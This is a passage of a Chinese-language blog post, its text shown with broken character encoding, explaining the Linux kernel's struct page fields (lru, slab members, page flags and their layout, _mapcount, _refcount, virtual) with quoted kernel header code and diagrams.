class="keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line">    <span class="type">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure><h2 id="I-å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ"><a href="#I-å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ" class="headerlink" title="I.å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ"></a>I.å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„å­—æ®µ</h2><p>ç®€å•è®²è®²å…¶ä¸­å‡ ä¸ªé‡è¦çš„æˆå‘˜</p><h3 id="lruï¼šLRU-é“¾è¡¨èŠ‚ç‚¹"><a href="#lruï¼šLRU-é“¾è¡¨èŠ‚ç‚¹" class="headerlink" title="lruï¼šLRU é“¾è¡¨èŠ‚ç‚¹"></a>lruï¼šLRU é“¾è¡¨èŠ‚ç‚¹</h3><p>lru å³ <code>Least Recently Used</code>ï¼Œåœ¨æ“ä½œç³»ç»Ÿè¯¾ç¨‹ä¸Šæˆ‘ä»¬å·²ç»å­¦ä¹ äº†è¿™ä¸ªé¡µé¢ç½®æ¢ç®—æ³•çš„æ¦‚å¿µï¼Œè¿™é‡Œä¸å†è¿‡å¤šèµ˜å™</p><p>åœ¨ Linux å†…æ ¸ä¸­ï¼Œpage ç»“æ„ä½“é€šè¿‡å…¶ lru å­—æ®µç»„ç»‡æˆé“¾è¡¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://i.loli.net/2021/11/25/QbuxcXTWdzMari5.png" alt="image.png"></p><p>lru æˆå‘˜æ˜¯ä¸€ä¸ª <code>struct list_head</code> ç±»å‹ï¼Œè¿™æ˜¯å†…æ ¸ä¸­é€šç”¨çš„åŒå‘é“¾è¡¨èŠ‚ç‚¹ç»“æ„</p><h3 id="slabç›¸å…³ç»“æ„ä½“"><a href="#slabç›¸å…³ç»“æ„ä½“" class="headerlink" title="**slabç›¸å…³ç»“æ„ä½“**"></a>**slabç›¸å…³ç»“æ„ä½“**</h3><p>åœ¨ page ç»“æ„ä½“ä¸­ä¸“é—¨æœ‰ç€ä¸€ä¸ªåŒ¿åç»“æ„ä½“ç”¨äºå­˜æ”¾ä¸ slab ç›¸å…³çš„æˆå‘˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* ä¾› slab, slob and slub ä½¿ç”¨ */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* Partial pages */</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">                    <span class="type">int</span> pages;    <span class="comment">/* å‰©ä½™çš„é¡µæ•°é‡ */</span></span><br><span class="line">                    <span class="type">int</span> pobjects;    <span class="comment">/* è¿‘ä¼¼è®¡æ•° */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pages;</span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* ä¸åœ¨ slob ä¸­ä½¿ç”¨ */</span></span><br><span class="line">            <span class="comment">/* ä¸¤ä¸ª word çš„èŒƒå›´ */</span></span><br><span class="line">            <span class="type">void</span> *freelist;        <span class="comment">/* ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="type">void</span> *s_mem;    <span class="comment">/* slab: first object */</span></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> counters;        <span class="comment">/* SLUB */</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>            <span class="comment">/* SLUB */</span></span><br><span class="line">                    <span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">                    <span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">                    <span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>Linux kernel ä¸­çš„ slab allocator ä¸€å…±æœ‰ä¸‰ç§ï¼šslabã€slobã€slubï¼Œå…¶ä¸­æ¯”è¾ƒå¸¸ç”¨çš„æ˜¯ slub åˆ†é…å™¨ï¼Œå…³äº slab allocator å°†åœ¨åç»­çš„æ–‡ç« ä¸­è¿›è¡Œæ›´ä¸ºè¯¦ç»†çš„å™è¿°ï¼Œä¸‹å›¾æ˜¯ä¸€å¼  slub åˆ†é…å™¨çš„ overview</p><p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h3 id="flagsï¼šæ ‡å¿—ä½"><a href="#flagsï¼šæ ‡å¿—ä½" class="headerlink" title="flagsï¼šæ ‡å¿—ä½"></a>flagsï¼šæ ‡å¿—ä½</h3><p>å³è¯¥é¡µçš„æ ‡å¿—ä½æˆå‘˜ï¼Œç”¨ä»¥è¡¨ç¤ºè¯¥é¡µæ‰€å¤„åœ¨çš„çŠ¶æ€ï¼Œæ¯ä¸€ä¸ªä½è¡¨ç¤ºä¸€ç§çŠ¶æ€ï¼Œæ•…ä¸€å¼ é¡µå¯ä»¥æœ‰ 32 ç§ä¸åŒçš„çŠ¶æ€ï¼Œè¿™äº›çŠ¶æ€å®šä¹‰äº <code>include/linux/page-flags.h</code> ä¸­ï¼Œ<strong>è¯¥å­—æ®µä¸ä½“ç³»æ— å…³</strong></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥å¤´æ–‡ä»¶ä¸­å®šä¹‰çš„æšä¸¾ç±»å‹è·å–ç›¸åº”çš„å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pageflags</span> &#123;</span></span><br><span class="line">    PG_locked,        <span class="comment">/* Page is locked. Don&#x27;t touch. */</span></span><br><span class="line">    PG_referenced,</span><br><span class="line">    PG_uptodate,</span><br><span class="line">    PG_dirty,</span><br><span class="line">    PG_lru,</span><br><span class="line">    PG_active,</span><br><span class="line">    PG_workingset,</span><br><span class="line">    PG_waiters,        <span class="comment">/* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */</span></span><br><span class="line">    PG_error,</span><br><span class="line">    PG_slab,</span><br><span class="line">    PG_owner_priv_1,    <span class="comment">/* Owner use. If pagecache, fs may use*/</span></span><br><span class="line">    PG_arch_1,</span><br><span class="line">    PG_reserved,</span><br><span class="line">    PG_private,        <span class="comment">/* If pagecache, has fs-private data */</span></span><br><span class="line">    PG_private_2,        <span class="comment">/* If pagecache, has fs aux data */</span></span><br><span class="line">    PG_writeback,        <span class="comment">/* Page is under writeback */</span></span><br><span class="line">    PG_head,        <span class="comment">/* A head page */</span></span><br><span class="line">    PG_mappedtodisk,    <span class="comment">/* Has blocks allocated on-disk */</span></span><br><span class="line">    PG_reclaim,        <span class="comment">/* To be reclaimed asap */</span></span><br><span class="line">    PG_swapbacked,        <span class="comment">/* Page is backed by RAM/swap */</span></span><br><span class="line">    PG_unevictable,        <span class="comment">/* Page is &quot;unevictable&quot;  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">    PG_mlocked,        <span class="comment">/* Page is vma mlocked */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ARCH_USES_PG_UNCACHED</span></span><br><span class="line">    PG_uncached,        <span class="comment">/* Page has been mapped as uncached */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line">    PG_hwpoison,        <span class="comment">/* hardware poisoned page. Don&#x27;t touch */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_IDLE_PAGE_TRACKING) &amp;&amp; defined(CONFIG_64BIT)</span></span><br><span class="line">    PG_young,</span><br><span class="line">    PG_idle,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">    PG_arch_2,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __NR_PAGEFLAGS,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Filesystems */</span></span><br><span class="line">    PG_checked = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* SwapBacked */</span></span><br><span class="line">    PG_swapcache = PG_owner_priv_1,    <span class="comment">/* Swap page: swp_entry_t in private */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Two page bits are conscripted by FS-Cache to maintain local caching</span></span><br><span class="line"><span class="comment">     * state.  These bits are set on pages belonging to the netfs&#x27;s inodes</span></span><br><span class="line"><span class="comment">     * when those inodes are being locally cached.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PG_fscache = PG_private_2,    <span class="comment">/* page backed by cache */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XEN */</span></span><br><span class="line">    <span class="comment">/* Pinned in Xen as a read-only pagetable page. */</span></span><br><span class="line">    PG_pinned = PG_owner_priv_1,</span><br><span class="line">    <span class="comment">/* Pinned as part of domain save (see xen_mm_pin_all()). */</span></span><br><span class="line">    PG_savepinned = PG_dirty,</span><br><span class="line">    <span class="comment">/* Has a grant mapping of another (foreign) domain&#x27;s page. */</span></span><br><span class="line">    PG_foreign = PG_owner_priv_1,</span><br><span class="line">    <span class="comment">/* Remapped by swiotlb-xen. */</span></span><br><span class="line">    PG_xen_remapped = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* SLOB */</span></span><br><span class="line">    PG_slob_free = PG_private,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compound pages. Stored in first tail page&#x27;s flags */</span></span><br><span class="line">    PG_double_map = PG_workingset,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* non-lru isolated movable page */</span></span><br><span class="line">    PG_isolated = PG_reclaim,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Only valid for buddy pages. Used to track pages that are reported */</span></span><br><span class="line">    PG_reported = PG_uptodate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>PG_locked</code>ï¼šè¯¥é¡µå·²è¢«ä¸Šé”ï¼Œè¯´æ˜æ­¤æ—¶è¯¥é¡µæ­£åœ¨è¢«ä½¿ç”¨</li><li><code>PG_referenced</code>ï¼šè¯¥é¡µåˆšåˆšè¢«è®¿é—®è¿‡ï¼›è¯¥æ ‡å¿—ä½ä¸ PG_reclaim æ ‡å¿—ä½å…±åŒè¢«ç”¨äºåŒ¿åä¸æ–‡ä»¶å¤‡ä»½ç¼“å­˜çš„é¡µé¢å›æ”¶</li><li><code>PG_uptodate</code>ï¼šè¯¥é¡µå¤„åœ¨æœ€æ–°çŠ¶æ€ï¼ˆup-to-dateï¼‰ï¼›å½“å¯¹è¯¥é¡µå®Œæˆä¸€æ¬¡è¯»å–æ—¶ï¼Œè¯¥é¡µä¾¿å˜æ›´ä¸º up-to-date çŠ¶æ€ï¼Œé™¤éå‘ç”Ÿäº†ç£ç›˜ IO é”™è¯¯</li><li><code>PG_dirty</code>ï¼šè¯¥é¡µä¸º<strong>è„é¡µ</strong>ï¼Œå³è¯¥é¡µçš„å†…å®¹å·²è¢«ä¿®æ”¹ï¼Œåº”å½“å°½å¿«å°†å†…å®¹å†™å›ç£ç›˜ä¸Š</li><li><code>PG_lru</code>ï¼šè¯¥é¡µå¤„åœ¨ä¸€ä¸ª LRU é“¾è¡¨ä¸Š</li><li><code>PG_active</code>ï¼šè¯¥é¡µé¢ä½äºæ´»è·ƒ lru é“¾è¡¨ä¸­</li><li><code>PG_workingset</code>ï¼šè¯¥é¡µä½äºæŸä¸ªè¿›ç¨‹çš„ working setï¼ˆå·¥ä½œé›†ï¼Œå³ä¸€ä¸ªè¿›ç¨‹åŒæ—¶ä½¿ç”¨çš„å†…å­˜æ•°é‡ï¼Œä¾‹å¦‚ä¸€ä¸ªè¿›ç¨‹å¯èƒ½åˆ†é…äº†114514MBå†…å­˜ï¼Œä½†æ˜¯åœ¨åŒä¸€æ—¶åˆ»åªä½¿ç”¨å…¶ä¸­çš„1919MBï¼Œè¿™å°±æ˜¯å·¥ä½œé›†ï¼‰ä¸­</li><li><code>PG_waiters</code>ï¼šæœ‰è¿›ç¨‹åœ¨ç­‰å¾…è¯¥é¡µé¢</li><li><code>PG_error</code>ï¼šè¯¥é¡µåœ¨ I&#x2F;O è¿‡ç¨‹ä¸­å‡ºç°äº†å·®é”™</li><li><code>PG_slab</code>ï¼šè¯¥é¡µç”± slab ä½¿ç”¨</li><li><code>PG_owner_priv_1</code>ï¼šè¯¥é¡µç”±å…¶æ‰€æœ‰è€…ä½¿ç”¨ï¼Œè‹¥æ˜¯ä½œä¸º pagecache é¡µé¢ï¼Œåˆ™å¯èƒ½æ˜¯è¢«æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨</li><li><code>PG_arch_1</code>ï¼šè¯¥æ ‡å¿—ä½ä¸ä½“ç³»ç»“æ„ç›¸å…³è”</li><li><code>PG_reserved</code>ï¼šè¯¥é¡µè¢«ä¿ç•™ï¼Œä¸èƒ½å¤Ÿè¢« swap outï¼ˆå†…æ ¸ä¼šå°†ä¸æ´»è·ƒçš„é¡µäº¤æ¢åˆ°ç£ç›˜ä¸Šï¼‰</li><li><code>PG_private</code> &amp;&amp; <code>PG_private2</code>ï¼šè¯¥é¡µæ‹¥æœ‰ç§æœ‰æ•°æ®ï¼ˆprivate å­—æ®µï¼‰</li><li><code>PG_writeback</code>ï¼šè¯¥é¡µæ­£åœ¨è¢«å†™åˆ°ç£ç›˜ä¸Š</li><li><code>PG_head</code>ï¼šåœ¨å†…æ ¸ä¸­æœ‰æ—¶éœ€è¦å°†å¤šä¸ªé¡µç»„æˆä¸€ä¸ª compound pagesï¼Œè€Œè®¾ç½®è¯¥çŠ¶æ€æ—¶è¡¨æ˜è¯¥é¡µæ˜¯ compound pages çš„ç¬¬ä¸€ä¸ªé¡µ</li><li><code>PG_mappedtodisk</code>ï¼šè¯¥é¡µè¢«æ˜ å°„åˆ°ç¡¬ç›˜ä¸­</li><li><code>PG_reclaim</code>ï¼šè¯¥é¡µå¯ä»¥è¢«å›æ”¶</li><li><code>PG_swapbacked</code>ï¼šè¯¥é¡µçš„åå¤‡å­˜å‚¨å™¨ä¸º swap&#x2F;RAM</li><li><code>PG_unevictable</code>ï¼šè¯¥é¡µä¸å¯è¢«å›æ”¶ï¼ˆè¢«é”ï¼‰ï¼Œä¸”ä¼šå‡ºç°åœ¨ <code>LRU_UNEVICTABLE</code> é“¾è¡¨ä¸­</li><li><code>PG_mlocked</code>ï¼šè¯¥é¡µè¢«å¯¹åº”çš„ vma ä¸Šé”ï¼ˆé€šå¸¸æ˜¯ç³»ç»Ÿè°ƒç”¨ mlockï¼‰</li><li><code>PG_uncached</code>ï¼šè¯¥é¡µè¢«è®¾ç½®ä¸ºä¸å¯ç¼“å­˜</li><li><code>PG_hwpoison</code>ï¼šç¡¬ä»¶ç›¸å…³çš„æ ‡å¿—ä½</li><li><code>PG_young</code>ï¼š</li><li><code>PG_idle</code>ï¼š</li><li><code>PG_arch_2</code>ï¼š64ä½ä¸‹çš„ä½“ç³»ç»“æ„ç›¸å…³æ ‡å¿—ä½</li></ul><h4 id="flags-å†…å­˜å¤ç”¨"><a href="#flags-å†…å­˜å¤ç”¨" class="headerlink" title="flags å†…å­˜å¤ç”¨"></a>flags å†…å­˜å¤ç”¨</h4><p>ä¸ºäº†èŠ‚çœç©ºé—´ï¼Œflags å­—æ®µé™¤äº†ç”¨ä½œæ ‡å¿—ä½å¤–è¿˜ç»™å…¶ä»–ç»“æ„ä½¿ç”¨ï¼Œå…¶åˆ’åˆ†çš„å½¢å¼å…¶å®ä¸å†…æ ¸é…ç½®çš„å†…å­˜æ¨¡å‹æœ‰å…³ï¼Œåœ¨ <code>include\linux\page-flags-layout.h</code>  æ–‡ä»¶ä¸­æè¿°äº†äº”ç§åˆ’åˆ†å½¢å¼ï¼ˆå…¶å®æ˜¯ä¸‰å¤§ç§ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * page-&gt;flags layout:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are five possibilities for how page-&gt;flags get laid out.  The first</span></span><br><span class="line"><span class="comment"> * pair is for the normal case without sparsemem. The second pair is for</span></span><br><span class="line"><span class="comment"> * sparsemem when there is plenty of space for node and section information.</span></span><br><span class="line"><span class="comment"> * The last is when there is insufficient space in page-&gt;flags and a separate</span></span><br><span class="line"><span class="comment"> * lookup is necessary.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * No sparsemem or sparsemem vmemmap: |       NODE     | ZONE |             ... | FLAGS |</span></span><br><span class="line"><span class="comment"> *      &quot; plus space for last_cpupid: |       NODE     | ZONE | LAST_CPUPID ... | FLAGS |</span></span><br><span class="line"><span class="comment"> * classic sparse with space for node:| SECTION | NODE | ZONE |             ... | FLAGS |</span></span><br><span class="line"><span class="comment"> *      &quot; plus space for last_cpupid: | SECTION | NODE | ZONE | LAST_CPUPID ... | FLAGS |</span></span><br><span class="line"><span class="comment"> * classic sparse no space for node:  | SECTION |     ZONE    | ... | FLAGS |</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h5 id="é-sparse-å†…å­˜æ¨¡å¼-x2F-sparse-vmemmap-å†…å­˜æ¨¡å¼"><a href="#é-sparse-å†…å­˜æ¨¡å¼-x2F-sparse-vmemmap-å†…å­˜æ¨¡å¼" class="headerlink" title="é sparse å†…å­˜æ¨¡å¼ &#x2F; sparse vmemmap å†…å­˜æ¨¡å¼"></a>é sparse å†…å­˜æ¨¡å¼ &#x2F; sparse vmemmap å†…å­˜æ¨¡å¼</h5><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä½ä½ç”¨ä½œè¯¥ page çš„ flagï¼Œé«˜ä½åˆ†åˆ«æ ‡è¯†å…¶å½’å±çš„ zoneï¼Œ node idï¼ˆé NUMA ç³»ç»Ÿä¸­ä¸º0ï¼‰ï¼Œä¸­é—´å‰©ä½™çš„ä½ä¿ç•™</p><p><img src="https://i.loli.net/2021/11/25/8J9pm3n1eZuTKi6.png" alt="image.png"></p><p>è¿™ç§å½¢å¼ä¸­è‹¥æ˜¯å¼€å¯äº† <code>last_cpuid</code> åˆ™æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ï¼š</p><p><img src="https://i.loli.net/2021/11/25/xhNpH3vkmli8EXt.png" alt="image.png"></p><h5 id="sparse-å†…å­˜æ¨¡å¼"><a href="#sparse-å†…å­˜æ¨¡å¼" class="headerlink" title="sparse å†…å­˜æ¨¡å¼"></a>sparse å†…å­˜æ¨¡å¼</h5><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç›¸æ¯”èµ·ç¬¬ä¸€ç§å½¢å¼å¤šäº†ä¸€ä¸ª SECTION å­—æ®µæ ‡è¯†å…¶å½’å±çš„ <code>mem_section</code></p><p><img src="https://i.loli.net/2021/11/25/CETbQSKwV8er5OR.png" alt="image.png"></p><p>è‹¥æ˜¯å¼€å¯äº† <code>last_cpuid</code> åˆ™æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­</p><p><img src="https://i.loli.net/2021/11/25/KDSHvF4LjOXpIcE.png" alt="image.png"></p><h5 id="æ²¡æœ‰-Node-çš„-sparse-å†…å­˜æ¨¡å¼"><a href="#æ²¡æœ‰-Node-çš„-sparse-å†…å­˜æ¨¡å¼" class="headerlink" title="æ²¡æœ‰ Node çš„ sparse å†…å­˜æ¨¡å¼"></a>æ²¡æœ‰ Node çš„ sparse å†…å­˜æ¨¡å¼</h5><p>ä¸»è¦æ˜¯é’ˆå¯¹é NUMA è®¾è®¡çš„ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹å–æ¶ˆäº† Node ç»“æ„</p><p><img src="https://i.loli.net/2021/11/25/QiJChHBdvARktOs.png" alt="image.png"></p><h3 id="mapcountï¼šæ˜ å°„è®¡æ•°"><a href="#mapcountï¼šæ˜ å°„è®¡æ•°" class="headerlink" title="_mapcountï¼šæ˜ å°„è®¡æ•°"></a>_mapcountï¼šæ˜ å°„è®¡æ•°</h3><p>è®°å½•è¯¥é¡µè¢«é¡µè¡¨æ˜ å°„çš„æ¬¡æ•°ï¼Œæ¯ä¸ªè¿›ç¨‹æœ‰å…¶ç‹¬ç«‹çš„é¡µè¡¨ï¼Œæ•…å¯ä»¥ç†è§£ä¸ºè¯¥å€¼è®°å½•äº†è¯¥é¡µè¢«å¤šå°‘ä¸ªè¿›ç¨‹å…±äº«ï¼Œå…¶åˆå§‹å€¼ä¸º -1</p><p>ç”±äºè¿™æ˜¯ä¸€ä¸ªè”åˆä½“ï¼Œè‹¥æ˜¯è¯¥é¡µæ—¢ä¸æ˜¯ PageSlab ä¹Ÿæ²¡æœ‰è¢«æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ï¼Œåˆ™ä¸º page_type å­—æ®µï¼Œå…·ä½“è¯´æ˜å®šä¹‰äº <code>/include/linux/page-flags.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For pages that are never mapped to userspace (and aren&#x27;t PageSlab),</span></span><br><span class="line"><span class="comment"> * page_type may be used.  Because it is initialised to -1, we invert the</span></span><br><span class="line"><span class="comment"> * sense of the bit, so __SetPageFoo *clears* the bit used for PageFoo, and</span></span><br><span class="line"><span class="comment"> * __ClearPageFoo *sets* the bit used for PageFoo.  We reserve a few high and</span></span><br><span class="line"><span class="comment"> * low bits so that an underflow or overflow of page_mapcount() won&#x27;t be</span></span><br><span class="line"><span class="comment"> * mistaken for a page type value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_TYPE_BASE    0xf0000000</span></span><br><span class="line"><span class="comment">/* Reserve        0x0000007f to catch underflows of page_mapcount */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPCOUNT_RESERVE    -128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_buddy    0x00000080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_offline    0x00000100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_table    0x00000200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_guard    0x00000400</span></span><br></pre></td></tr></table></figure><h3 id="refcountï¼šå¼•ç”¨è®¡æ•°"><a href="#refcountï¼šå¼•ç”¨è®¡æ•°" class="headerlink" title="_refcountï¼šå¼•ç”¨è®¡æ•°"></a>_refcountï¼šå¼•ç”¨è®¡æ•°</h3><p>è¯¥å­—æ®µç”¨ä½œè¯¥é¡µé¢<strong>åœ¨å†…æ ¸ä¸­</strong>çš„å¼•ç”¨è®¡æ•°å™¨ï¼Œåˆå§‹æ—¶é¡µé¢ä¸ºç©ºé—²çŠ¶æ€ï¼Œè¯¥è®¡æ•°å™¨ä¸º 0ï¼Œæ¯å½“è¯¥é¡µé¢è¢«åˆ†é…å¼•ç”¨æ—¶è®¡æ•°å™¨ä¼š + 1ï¼Œè¢«å…¶ä»–é¡µé¢è¿›è¡Œå¼•ç”¨æ—¶ä¹Ÿä¼š + 1</p><p>å½“å¼•ç”¨è®¡æ•°å™¨ä¸º 0 æ—¶è¡¨ç¤ºè¯¥é¡µé¢ä¸ºç©ºé—²çŠ¶æ€æˆ–å³å°†è¦è¢«é‡Šæ”¾ï¼Œè‹¥å¤§äº 0 åˆ™è¡¨ç¤ºæ­£åœ¨è¢«ä½¿ç”¨ï¼Œæš‚æ—¶ä¸ä¼šé‡Šæ”¾</p><p>å†…æ ¸ä¸­æä¾›äº†ä¸¤ä¸ªå‡½æ•° <code>get_page()</code>ä¸ <code>put_page()</code> æ¥è¿›è¡Œå¼•ç”¨è®¡æ•°çš„å¢å‡ï¼Œåè€…åœ¨å¼•ç”¨è®¡æ•°å™¨ä¸º 1 æ—¶ä¼šè°ƒç”¨ <code>__put_single_page()</code> é‡Šæ”¾è¯¥é¡µé¢ï¼ˆ1-&gt;0ï¼Œè¯¥é¡µé¢å·²ç©ºé—²ï¼‰</p><h3 id="virtualï¼šè™šæ‹Ÿåœ°å€"><a href="#virtualï¼šè™šæ‹Ÿåœ°å€" class="headerlink" title="**virtualï¼šè™šæ‹Ÿåœ°å€**"></a>**virtualï¼šè™šæ‹Ÿåœ°å€**</h3><p>è¯¥å­—æ®µä¸ºè¯¥ç‰©ç†é¡µæ¡†å¯¹åº”çš„çš„<strong>è™šæ‹Ÿåœ°å€</strong>ï¼Œé‚£ä¹ˆè¿™é‡Œåˆè¦æ”¾ä¸Šè¿™å¼ ç»å…¸çš„å›¾ï¼š</p><p><img src="https://i.loli.net/2021/11/23/q6jTAJkU9XuCHWV.png" alt="image.png"></p><p>æ¯ä¸€ä¸ª struct page å¯¹åº”ä¸€ä¸ªç‰©ç†é¡µæ¡†ï¼Œé‚£ä¹ˆè¿™ä¸ª virtual å­—æ®µå…¶å®å°±æ˜¯<strong>ä¸Šå›¾çš„åå‘æ˜ å°„</strong></p><h2 id="II-ä¸åŒå†…å­˜æ¨¡å‹ä¸‹çš„-struct-page-å­˜å‚¨æ–¹å¼"><a 